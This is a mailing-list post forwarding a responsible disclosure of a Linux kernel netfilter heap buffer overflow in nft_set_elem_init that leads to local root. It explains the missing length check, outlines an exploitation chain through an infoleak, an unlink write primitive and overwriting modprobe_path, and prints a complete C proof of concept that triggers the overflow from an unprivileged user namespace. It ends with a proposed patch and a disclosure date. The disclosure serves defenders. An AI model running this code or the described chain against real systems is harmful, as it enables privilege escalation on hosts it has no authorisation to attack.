Received: (qmail 20222 invoked by uid 550); 2 Jul 2022 21:56:57 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 19859 invoked from network); 2 Jul 2022 21:56:31 -0000
Date: Sat, 2 Jul 2022 23:55:40 +0200
From: Solar Designer <solar@openwall.com>
To: oss-security@lists.openwall.com
Cc: Hugues ANGUELKOV <hanguelkov@randorisec.fr>
Message-ID: <20220702215539.GA14413@openwall.com>
References: <20220702193746.GA12948@openwall.com>
Mime-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <20220702193746.GA12948@openwall.com>
User-Agent: Mutt/1.4.2.3i
Subject: Re: [oss-security] Linux kernel: Netfilter heap buffer overflow in nft_set_elem_init

On Sat, Jul 02, 2022 at 09:37:46PM +0200, Solar Designer wrote:
> The message below was meant to start an embargo for the issue, but it
> was CC'ed to netfilter-devel, which is a public mailing list, so it also
> appears here:
> 
> https://lore.kernel.org/netfilter-devel/cd9428b6-7ffb-dd22-d949-d86f4869f452@randorisec.fr/T/#u

I'm sorry I got the encoding wrong, breaking the non-breaking spaces.
Let me try again, below.  (Not trying to fix the line wrapping, which
would be too invasive an edit to make to someone else's message.)

----- Forwarded message from Hugues ANGUELKOV <hanguelkov@randorisec.fr> -----

Date: Fri, 1 Jul 2022 17:43:16 +0200
To: linux-distros
Cc: security, pablo, kadlec, fw, netfilter-devel, coreteam, davy, amongodin
From: Hugues ANGUELKOV <hanguelkov@randorisec.fr>
Subject: [vs] Netfilter vulnerability disclosure

Hello everyone,

One of our collaborators at RandoriSec, Arthur Mongodin found a 
vulnerability within the netfilter subsystem during his internship.
Successful exploitation of this bug leads to a Local Privilege 
Escalation (LPE) to the `root` user, as tested on Ubuntu server 22.04 
(Linux 5.15.0-39-generic).
This vulnerability is a heap buffer overflow due to a weak check and has 
been introduced within the commit 
[fdb9c405e35bdc6e305b9b4e20ebc141ed14fc81](https://github.com/torvalds/linux/commit/fdb9c405e35bdc6e305b9b4e20ebc141ed14fc81), 
it affects the Linux kernel since the version 5.8 and is still present today.

The heap buffer overflow happens in the function `nft_set_elem_init` 
(`/net/netfilter/nf_tables_api.c`)

```c
void *nft_set_elem_init(const struct nft_set *set,
ššššššššššš const struct nft_set_ext_tmpl *tmpl,
ššššššššššš const u32 *key, const u32 *key_end,
ššššššššššš const u32 *data, u64 timeout, u64 expiration, gfp_t gfp)
{
ššš struct nft_set_ext *ext;
ššš void *elem;

ššš elem = kzalloc(set->ops->elemsize + tmpl->len, 
gfp);ššššššššššššššššššš <===== (0)
ššš if (elem == NULL)
ššššššš return NULL;

ššš ...

ššš if (nft_set_ext_exists(ext, NFT_SET_EXT_DATA))
ššššššš memcpy(nft_set_ext_data(ext), data, 
set->dlen);šššššššššššššššššššš <===== (1)

ššš ...

ššš return elem;
}
```

A buffer is allocated at (0) without taking in consideration the value 
`set->dlen` used at (1) for the copy.
The computation of the needed space (`tmpl->len`) is realized before the 
call to `nft_set_elem_init`, however,
ša weak check on a user input allows a user to provide an element with 
a data length lower than the `set->dlen` for the allocation.
This check is located within the function `nft_set_elem_parse_data` 
(`/net/netfilter/nf_tables_api.c`).

```c
static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
ššššššššššššššššš struct nft_data_desc *desc,
ššššššššššššššššš struct nft_data *data,
ššššššššššššššššš struct nlattr *attr)
{

ššš ...

ššš if (desc->type != NFT_DATA_VERDICT && desc->len != set->dlen) 
{šššššššš <===== (2)
ššššššš nft_data_release(data, desc->type);
ššššššš return -EINVAL;
ššš }

ššš return 0;
}
```

As we can see at (2), if the data type is `NFT_DATA_VERDICT`, the 
comparison between `desc->len` and `set->dlen` is not done.
Finally, `desc->len` it is used to compute `tmpl->len` at (0) and 
`set->dlen` for the copy at (1) and they can be different.

The vulnerable code path can be reached if the kernel is built with the 
configuration `CONFIG_NETFILTER`, `CONFIG_NF_TABLES` enabled.
To exploit the vulnerability, an attacker may need to obtain an 
unprivileged user namespace to gain the capability `CAP_NET_ADMIN` 
(`CONFIG_USER_NS` and `CONFIG_NET_NS` enabled, and 
`kernel.unprivileged_userns_clone = 1`).


The exploitation was simplified by the use of an uninitialized variable 
in `nft_add_set_elem`:

```c
static int nft_add_set_elem(struct nft_ctx *ctx, struct nft_set *set, 
const struct nlattr *attr, u32 nlmsg_flags)
{
š struct nft_set_elem elem;
š ...
}
```

First we add an `elem` with the type `NFT_DATA_VALUE`, then `elem.data` 
will be filled `set->dlen` bytes, the second iteration will only erase 
the first bytes of `elem.data` with an element of type `NFT_DATA_VERDICT`.

We get an infoleak by overwriting the field `datalen` of 
an`user_key_payload` structure. The write primitive can be obtained with 
an unlinking attack on the `list_head` of the `simple_xattr` structure.
We targeted the `modprobe_path` to gain root permission by executing a 
shell wrapper.

The following Proof of Concept (PoC) will trigger KASAN on the upstream 
kernel (Linux 5.19.0-rc4)

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <arpa/inet.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>

#define do_error_exit(msg) do {perror("[-] " msg); exit(EXIT_FAILURE); } 
while(0)

#define ID 1337
#define SET_NAME "name\0\0\0"
#define LEAK_SET_NAME "leak\0\0\0"
#define TABLE "table\0\0"

#define U32_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint32_t))
#define U64_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint64_t))
#define S8_NLA_SIZE (sizeof(struct nlattr) + 8)
#define NLA_BIN_SIZE(x) (sizeof(struct nlattr) + x)
#define NLA_ATTR(attr) ((void *)attr + NLA_HDRLEN)

#define TABLEMSG_SIZE NLMSG_SPACE(sizeof(struct nfgenmsg) + 
sizeof(struct nlattr) + 8)

#define KMALLOC64_KEYLEN (64 - 8 - 12 - 16) // Max size - elemsize - 
sizeof(nft_set_ext)(align) - min datasize

#define BUFFER_SIZE 64

uint8_t buffer[BUFFER_SIZE] = {0};

void new_ns(void) {

ššš if (unshare(CLONE_NEWUSER))
ššššššš do_error_exit("unshare(CLONE_NEWUSER)");

ššš if (unshare(CLONE_NEWNET))
ššššššš do_error_exit("unshare(CLONE_NEWNET)");
}

struct nlmsghdr *get_batch_begin_nlmsg(void) {

ššš struct nlmsghdr *nlh = (struct nlmsghdr 
*)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
ššš struct nfgenmsg *nfgm = (struct nfgenmsg *)NLMSG_DATA(nlh);

ššš if (!nlh)
ššššššš do_error_exit("malloc");

ššš memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
ššš nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
ššš nlh->nlmsg_type = NFNL_MSG_BATCH_BEGIN;
ššš nlh->nlmsg_pid = getpid();
ššš nlh->nlmsg_flags = 0;
ššš nlh->nlmsg_seq = 0;

ššš /* Used to access to the netfilter tables subsystem */
ššš nfgm->res_id = NFNL_SUBSYS_NFTABLES;

ššš return nlh;
}

struct nlmsghdr *get_batch_end_nlmsg(void) {

ššš struct nlmsghdr *nlh = (struct nlmsghdr 
*)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));

ššš if (!nlh)
ššššššš do_error_exit("malloc");

ššš memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
ššš nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
ššš nlh->nlmsg_type = NFNL_MSG_BATCH_END;
ššš nlh->nlmsg_pid = getpid();
ššš nlh->nlmsg_flags = NLM_F_REQUEST;
ššš nlh->nlmsg_seq = 0;

ššš return nlh;
}

struct nlattr *set_nested_attr(struct nlattr *attr, uint16_t type, 
uint16_t data_len) {
ššš attr->nla_type = type;
ššš attr->nla_len = NLA_ALIGN(data_len + sizeof(struct nlattr));
ššš return (void *)attr + sizeof(struct nlattr);
}

struct nlattr *set_u32_attr(struct nlattr *attr, uint16_t type, uint32_t 
value) {
ššš attr->nla_type = type;
ššš attr->nla_len = U32_NLA_SIZE;
ššš *(uint32_t *)NLA_ATTR(attr) = htonl(value);

ššš return (void *)attr + U32_NLA_SIZE;
}

struct nlattr *set_str8_attr(struct nlattr *attr, uint16_t type, const 
char name[8]) {
ššš attr->nla_type = type;
ššš attr->nla_len = S8_NLA_SIZE;
ššš memcpy(NLA_ATTR(attr), name, 8);

ššš return (void *)attr + S8_NLA_SIZE;
}

struct nlattr *set_binary_attr(struct nlattr *attr, uint16_t type, 
uint8_t *buffer, uint64_t buffer_size) {
ššš attr->nla_type = type;
ššš attr->nla_len = NLA_BIN_SIZE(buffer_size);
ššš memcpy(NLA_ATTR(attr), buffer, buffer_size);

ššš return (void *)attr + NLA_ALIGN(NLA_BIN_SIZE(buffer_size));
}
void create_table(int sock, const char *name) {
ššš struct msghdr msg;
ššš struct sockaddr_nl dest_snl;
ššš struct iovec iov[3];
ššš struct nlmsghdr *nlh_batch_begin;
ššš struct nlmsghdr *nlh;
ššš struct nlmsghdr *nlh_batch_end;
ššš struct nlattr *attr;
ššš struct nfgenmsg *nfm;

ššš /* Destination preparation */
ššš memset(&dest_snl, 0, sizeof(dest_snl));
ššš dest_snl.nl_family = AF_NETLINK;
ššš memset(&msg, 0, sizeof(msg));

ššš /* Netlink batch_begin message preparation */
ššš nlh_batch_begin = get_batch_begin_nlmsg();

ššš /* Netlink table message preparation */
ššš nlh = (struct nlmsghdr *)malloc(TABLEMSG_SIZE);
ššš if (!nlh)
ššššššš do_error_exit("malloc");

ššš memset(nlh, 0, TABLEMSG_SIZE);
ššš nlh->nlmsg_len = TABLEMSG_SIZE;
ššš nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE;
ššš nlh->nlmsg_pid = getpid();
ššš nlh->nlmsg_flags = NLM_F_REQUEST;
ššš nlh->nlmsg_seq = 0;

ššš nfm = NLMSG_DATA(nlh);
ššš nfm->nfgen_family = NFPROTO_INET;

ššš /** Prepare associated attribute **/
ššš attr = (void *)nlh + NLMSG_SPACE(sizeof(struct nfgenmsg));
ššš set_str8_attr(attr, NFTA_TABLE_NAME, name);

ššš /* Netlink batch_end message preparation */
ššš nlh_batch_end = get_batch_end_nlmsg();

ššš /* IOV preparation */
ššš memset(iov, 0, sizeof(struct iovec) * 3);
ššš iov[0].iov_base = (void *)nlh_batch_begin;
ššš iov[0].iov_len = nlh_batch_begin->nlmsg_len;
ššš iov[1].iov_base = (void *)nlh;
ššš iov[1].iov_len = nlh->nlmsg_len;
ššš iov[2].iov_base = (void *)nlh_batch_end;
ššš iov[2].iov_len = nlh_batch_end->nlmsg_len;

ššš /* Message header preparation */
ššš msg.msg_name = (void *)&dest_snl;
ššš msg.msg_namelen = sizeof(struct sockaddr_nl);
ššš msg.msg_iov = iov;
ššš msg.msg_iovlen = 3;

ššš sendmsg(sock, &msg, 0);

ššš /* Free used structures */
ššš free(nlh_batch_end);
ššš free(nlh);
ššš free(nlh_batch_begin);
}

void create_set(int sock, const char *set_name, uint32_t set_keylen, 
uint32_t data_len, const char *table_name, uint32_t id) {
ššš struct msghdr msg;
ššš struct sockaddr_nl dest_snl;
ššš struct nlmsghdr *nlh_batch_begin;
ššš struct nlmsghdr *nlh_payload;
ššš struct nlmsghdr *nlh_batch_end;
ššš struct nfgenmsg *nfm;
ššš struct nlattr *attr;
ššš uint64_t nlh_payload_size;
ššš struct iovec iov[3];

ššš /* Prepare the netlink sockaddr for msg */
ššš memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
ššš dest_snl.nl_family = AF_NETLINK;

ššš /* First netlink message: batch_begin */
ššš nlh_batch_begin = get_batch_begin_nlmsg();

ššš /* Second netlink message : Set attributes */
ššš nlh_payload_size = sizeof(struct 
nfgenmsg);šššššššššššššššššššššššššššššššššššš // Mandatory
ššš nlh_payload_size += 
S8_NLA_SIZE;ššššššššššššššššššššššššššššššššššššššššššššššš // 
NFTA_SET_TABLE
ššš nlh_payload_size += 
S8_NLA_SIZE;ššššššššššššššššššššššššššššššššššššššššššššššš // NFTA_SET_NAME
ššš nlh_payload_size += 
U32_NLA_SIZE;šššššššššššššššššššššššššššššššššššššššššššššš // NFTA_SET_ID
ššš nlh_payload_size += 
U32_NLA_SIZE;šššššššššššššššššššššššššššššššššššššššššššššš // 
NFTA_SET_KEY_LEN
ššš nlh_payload_size += 
U32_NLA_SIZE;šššššššššššššššššššššššššššššššššššššššššššššš // 
NFTA_SET_FLAGS
ššš nlh_payload_size += 
U32_NLA_SIZE;šššššššššššššššššššššššššššššššššššššššššššššš // 
NFTA_SET_DATA_TYPE
ššš nlh_payload_size += 
U32_NLA_SIZE;šššššššššššššššššššššššššššššššššššššššššššššš // 
NFTA_SET_DATA_LEN
ššš nlh_payload_size = NLMSG_SPACE(nlh_payload_size);

ššš /** Allocation **/
ššš nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
ššš if (!nlh_payload)
ššššššš do_error_exit("malloc");

ššš memset(nlh_payload, 0, nlh_payload_size);

ššš /** Fill the required fields **/
ššš nlh_payload->nlmsg_len = nlh_payload_size;
ššš nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET;
ššš nlh_payload->nlmsg_pid = getpid();
ššš nlh_payload->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
ššš nlh_payload->nlmsg_seq = 0;


ššš /** Setup the nfgenmsg **/
ššš nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
ššš nfm->nfgen_family = 
NFPROTO_INET;šššššššššššššššššššššššššššššššššššššššššššššš // Verify if 
it is compulsory

ššš /** Setup the attributes */
ššš attr = (struct nlattr *)((void *)nlh_payload + 
NLMSG_SPACE(sizeof(struct nfgenmsg)));
ššš attr = set_str8_attr(attr, NFTA_SET_TABLE, table_name);
ššš attr = set_str8_attr(attr, NFTA_SET_NAME, set_name);
ššš attr = set_u32_attr(attr, NFTA_SET_ID, id);
ššš attr = set_u32_attr(attr, NFTA_SET_KEY_LEN, set_keylen);
ššš attr = set_u32_attr(attr, NFTA_SET_FLAGS, NFT_SET_MAP);
ššš attr = set_u32_attr(attr, NFTA_SET_DATA_TYPE, 0);
ššš set_u32_attr(attr, NFTA_SET_DATA_LEN, data_len);

ššš /* Last netlink message: batch_end */
ššš nlh_batch_end = get_batch_end_nlmsg();

ššš /* Setup the iovec */
ššš memset(iov, 0, sizeof(struct iovec) * 3);
ššš iov[0].iov_base = (void *)nlh_batch_begin;
ššš iov[0].iov_len = nlh_batch_begin->nlmsg_len;
ššš iov[1].iov_base = (void *)nlh_payload;
ššš iov[1].iov_len = nlh_payload->nlmsg_len;
ššš iov[2].iov_base = (void *)nlh_batch_end;
ššš iov[2].iov_len = nlh_batch_end->nlmsg_len;

ššš /* Prepare the message to send */
ššš memset(&msg, 0, sizeof(struct msghdr));
ššš msg.msg_name = (void *)&dest_snl;
ššš msg.msg_namelen = sizeof(struct sockaddr_nl);
ššš msg.msg_iov = iov;
ššš msg.msg_iovlen = 3;

ššš /* Send message */
ššš sendmsg(sock, &msg, 0);

ššš /* Free allocated memory */
ššš free(nlh_batch_end);
ššš free(nlh_payload);
ššš free(nlh_batch_begin);
}

void add_elem_to_set(int sock, const char *set_name, uint32_t 
set_keylen, const char *table_name, uint32_t id, uint32_t data_len, 
uint8_t *data) {
ššš struct msghdr msg;
ššš struct sockaddr_nl dest_snl;
ššš struct nlmsghdr *nlh_batch_begin;
ššš struct nlmsghdr *nlh_payload;
ššš struct nlmsghdr *nlh_batch_end;
ššš struct nfgenmsg *nfm;
ššš struct nlattr *attr;
ššš uint64_t nlh_payload_size;
ššš uint64_t nested_attr_size;
ššš struct iovec iov[3];

ššš /* Prepare the netlink sockaddr for msg */
ššš memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
ššš dest_snl.nl_family = AF_NETLINK;

ššš /* First netlink message: batch */
ššš nlh_batch_begin = get_batch_begin_nlmsg();

ššš /* Second netlink message : Set attributes */

ššš /** Precompute the size of the nested field **/
ššš nested_attr_size = 0;

ššš nested_attr_size += sizeof(struct 
nlattr);ššššššššššššššššššššššššššššššššššššš // Englobing attribute
ššš nested_attr_size += sizeof(struct 
nlattr);ššššššššššššššššššššššššššššššššššššš // NFTA_SET_ELEM_KEY
ššš nested_attr_size += 
NLA_BIN_SIZE(set_keylen);ššššššššššššššššššššššššššššššššššššš // 
NFTA_DATA_VALUE
ššš nested_attr_size += sizeof(struct 
nlattr);ššššššššššššššššššššššššššššššššššššš // NFTA_SET_ELEM_DATA
ššš nested_attr_size += sizeof(struct 
nlattr);ššššššššššššššššššššššššššššššššššššš // NFTA_DATA_VERDICT
ššš nested_attr_size += 
U32_NLA_SIZE;šššššššššššššššššššššššššššššššššššššššššššššš // 
NFTA_VERDICT_CODE

ššš nlh_payload_size = sizeof(struct 
nfgenmsg);šššššššššššššššššššššššššššššššššššš // Mandatory
ššš nlh_payload_size += sizeof(struct 
nlattr);ššššššššššššššššššššššššššššššššššššš // NFTA_SET_ELEM_LIST_ELEMENTS
ššš nlh_payload_size += 
nested_attr_size;šššššššššššššššššššššššššššššššššššššššššš // All the 
stuff described above
ššš nlh_payload_size += 
S8_NLA_SIZE;ššššššššššššššššššššššššššššššššššššššššššššššš // 
NFTA_SET_ELEM_LIST_TABLE
ššš nlh_payload_size += 
S8_NLA_SIZE;ššššššššššššššššššššššššššššššššššššššššššššššš // 
NFTA_SET_ELEM_LIST_SET
ššš nlh_payload_size += 
U32_NLA_SIZE;šššššššššššššššššššššššššššššššššššššššššššššš // 
NFTA_SET_ELEM_LIST_SET_ID
ššš nlh_payload_size = NLMSG_SPACE(nlh_payload_size);

ššš /** Allocation **/
ššš nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
ššš if (!nlh_payload) {
ššššššš do_error_exit("malloc");
ššš }
ššš memset(nlh_payload, 0, nlh_payload_size);

ššš /** Fill the required fields **/
ššš nlh_payload->nlmsg_len = nlh_payload_size;
ššš nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | 
NFT_MSG_NEWSETELEM;
ššš nlh_payload->nlmsg_pid = getpid();
ššš nlh_payload->nlmsg_flags = NLM_F_REQUEST;
ššš nlh_payload->nlmsg_seq = 0;

ššš /** Setup the nfgenmsg **/
ššš nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
ššš nfm->nfgen_family = NFPROTO_INET;

ššš /** Setup the attributes */
ššš attr = (struct nlattr *)((void *)nlh_payload + 
NLMSG_SPACE(sizeof(struct nfgenmsg)));
ššš attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_TABLE, table_name);
ššš attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_SET, set_name);
ššš attr = set_u32_attr(attr, NFTA_SET_ELEM_LIST_SET_ID, id);
ššš attr = set_nested_attr(attr, NFTA_SET_ELEM_LIST_ELEMENTS, 
nested_attr_size);

ššš attr = set_nested_attr(attr, 0, nested_attr_size - 4);
ššš attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY, 
NLA_BIN_SIZE(set_keylen));
ššš attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)buffer, 
set_keylen);
ššš attr = set_nested_attr(attr, NFTA_SET_ELEM_DATA, U32_NLA_SIZE + 
sizeof(struct nlattr));
ššš attr = set_nested_attr(attr, NFTA_DATA_VERDICT, U32_NLA_SIZE);
ššš set_u32_attr(attr, NFTA_VERDICT_CODE, NFT_CONTINUE);

ššš /* Last netlink message: End of batch */
ššš nlh_batch_end = get_batch_end_nlmsg();

ššš /* Setup the iovec */
ššš memset(iov, 0, sizeof(struct iovec) * 3);
ššš iov[0].iov_base = (void *)nlh_batch_begin;
ššš iov[0].iov_len = nlh_batch_begin->nlmsg_len;
ššš iov[1].iov_base = (void *)nlh_payload;
ššš iov[1].iov_len = nlh_payload->nlmsg_len;
ššš iov[2].iov_base = (void *)nlh_batch_end;
ššš iov[2].iov_len = nlh_batch_end->nlmsg_len;

ššš /* Prepare the message to send */
ššš memset(&msg, 0, sizeof(struct msghdr));
ššš msg.msg_name = (void *)&dest_snl;
ššš msg.msg_namelen = sizeof(struct sockaddr_nl);
ššš msg.msg_iov = iov;
ššš msg.msg_iovlen = 3;

ššš /* Send message */
ššš sendmsg(sock, &msg, 0);

ššš /* Free allocated memory */
ššš free(nlh_batch_end);
ššš free(nlh_payload);
ššš free(nlh_batch_begin);
}

int main(int argc, char **argv) {

ššš int sock;
ššš struct sockaddr_nl snl;
ššš struct leak *bases;

ššš new_ns();
ššš printf("[+] Get CAP_NET_ADMIN capability\n");

ššš /* Netfilter netlink socket creation */
ššš if ((sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) < 0) {
ššššššš do_error_exit("socket");
ššš }
ššš printf("[+] Netlink socket created\n");

ššš // Binding
ššš memset(&snl, 0, sizeof(snl));
ššš snl.nl_family = AF_NETLINK;
ššš snl.nl_pid = getpid();
ššš if (bind(sock, (struct sockaddr *)&snl, sizeof(snl)) < 0) {
ššššššš do_error_exit("bind");
ššš }
ššš printf("[+] Netlink socket bound\n");

ššš /* Create a netfilter table */
ššš create_table(sock, TABLE);
ššš printf("[+] Table created\n");

ššš /*š Create a netfilter set */
ššš create_set(sock, SET_NAME, KMALLOC64_KEYLEN, BUFFER_SIZE, TABLE, ID);
ššš printf("[+] Set created\n");

ššš /* Prepare the payload for the write primitive */
ššš add_elem_to_set(sock, SET_NAME, KMALLOC64_KEYLEN, TABLE, ID, 
BUFFER_SIZE, buffer);
ššš printf("[+] Overflow done\n");

ššš return EXIT_SUCCESS;
}
```

We propose the following patch. We think that the comparison must be 
mandatory and may be enough for patch this vulnerability.
However, we are not experts at Linux kernel programming and we are still 
unsure if it will not break something along the way.
This patch was applied on the current upstream version.

```diff
static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
ššššššššššššššššš struct nft_data_desc *desc,
ššššššššššššššššš struct nft_data *data,
ššššššššššššššššš struct nlattr *attr)
{

ššš ...

-ššš if (desc->type != NFT_DATA_VERDICT && desc->len != set->dlen) {
+ššš if (desc->len != set->dlen) {

šš šššš ššš ššš nft_data_release(data, desc->type);
ššššššš return -EINVAL;
ššš }

ššš return 0;
}
```

We would like to reserve a CVE for this vulnerability.

Also, we would like to release the LPE exploit targeting Ubuntu server 
along with a more detailed blogpost.
If needed, we can supply the exploit. Depending of your workload, we can 
suggest the August, 15th 2022 as a potential date for public disclosure.

Thank you for your attention and we also would like to thank you for all 
the work put on the Linux kernel.

----- End forwarded message -----
